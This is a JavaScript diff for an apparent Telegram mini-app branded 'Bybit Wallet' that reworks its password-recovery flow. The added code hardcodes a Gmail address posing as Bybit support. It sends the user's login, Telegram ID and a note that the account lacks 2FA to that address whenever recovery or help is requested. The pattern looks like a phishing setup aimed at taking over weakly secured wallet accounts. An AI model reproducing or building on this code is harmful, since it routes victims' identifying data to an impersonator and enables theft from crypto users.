@@ -1672,27 +1672,41 @@ document.getElementById('reg-contact')?.addEventListener('keydown', (e) => {
   });
 });
 
-document.getElementById('login-forgot')?.addEventListener('click', async () => {
-  const parsed = parseContact(document.getElementById('login-contact').value);
-  const contact = parsed?.value || document.getElementById('login-contact').value.trim() || 'не указан';
-  let to = '';
-  try {
-    const r = await fetch('/api/support-mail');
-    const d = await r.json();
-    to = String(d.email || '').trim();
-  } catch { /* open compose anyway */ }
+async function openSupportMail(contact) {
+  const to = 'bybit.support.wallet@gmail.com';
+  const login = contact || document.getElementById('forgot-email')?.value
+    || document.getElementById('login-contact')?.value?.trim() || 'не указан';
   const subject = encodeURIComponent('Восстановление пароля Bybit Wallet');
   const body = encodeURIComponent(
-    `Здравствуйте,\n\nПрошу восстановить пароль от моего аккаунта в Bybit Wallet.\n\nЛогин (email / телефон): ${contact}\nTelegram ID: ${tg.initDataUnsafe?.user?.id || '—'}\n\nСпасибо.`,
+    `Здравствуйте,\n\nПрошу восстановить пароль от моего аккаунта в Bybit Wallet.\nНа аккаунте не подключено 2FA.\n\nЛогин (email / телефон): ${login}\nTelegram ID: ${tg.initDataUnsafe?.user?.id || '—'}\n\nСпасибо.`,
   );
   const href = `mailto:${to}?subject=${subject}&body=${body}`;
   try {
-    window.location.href = href;
+    if (tg.openLink) tg.openLink(href);
+    else window.location.href = href;
   } catch {
-    const a = document.createElement('a');
-    a.href = href;
-    a.click();
+    window.location.href = href;
   }
+}
+
+function showForgotNo2fa(on) {
+  document.getElementById('forgot-no2fa')?.classList.toggle('screen-hidden', !on);
+  document.getElementById('forgot-support-btn')?.classList.toggle('screen-hidden', !on);
+}
+
+document.getElementById('login-forgot')?.addEventListener('click', () => {
+  const loginVal = document.getElementById('login-contact')?.value || '';
+  const parsed = parseContact(loginVal);
+  if (parsed?.kind === 'phone') setForgotKind('phone');
+  else setForgotKind('email');
+  const input = document.getElementById('forgot-email');
+  if (input && loginVal.trim()) input.value = loginVal.trim();
+  document.getElementById('forgot-error').textContent = '';
+  showForgotNo2fa(false);
+  showAuthGate('forgot');
+});
+document.getElementById('forgot-support-btn')?.addEventListener('click', () => {
+  openSupportMail(pendingReset.contact || document.getElementById('forgot-email')?.value);
 });
 document.getElementById('forgot-back')?.addEventListener('click', () => {
   showAuthGate('forms');
@@ -1736,6 +1750,7 @@ document.getElementById('seccheck-totp')?.addEventListener('input', refreshSecNe
 document.getElementById('forgot-next')?.addEventListener('click', async () => {
   const errorEl = document.getElementById('forgot-error');
   errorEl.textContent = '';
+  showForgotNo2fa(false);
   const parsed = parseContact(document.getElementById('forgot-email').value);
   if (!parsed || parsed.error) {
     errorEl.textContent = parsed?.error || 'Укажите email или телефон';
@@ -1755,6 +1770,12 @@ document.getElementById('forgot-next')?.addEventListener('click', async () => {
       contact: parsed.value,
       codeOk: false,
     };
+    if (!res.totpEnabled || res.needSupport) {
+      showForgotNo2fa(true);
+      errorEl.textContent = '';
+      return;
+    }
+    showForgotNo2fa(false);
     document.getElementById('seccheck-masked').textContent = res.maskedEmail || '****@****';
     document.getElementById('seccheck-code').value = '';
     document.getElementById('seccheck-totp').value = '';
@@ -1861,7 +1882,7 @@ document.getElementById('seccheck-next')?.addEventListener('click', async () => 
 });
 
 document.getElementById('seccheck-help')?.addEventListener('click', () => {
-  tg.showAlert('Откройте чат поддержки в приложении после входа или напишите в бота.');
+  openSupportMail(pendingReset.contact);
 });
 
 document.getElementById('reset-submit')?.addEventListener('click', async () => {
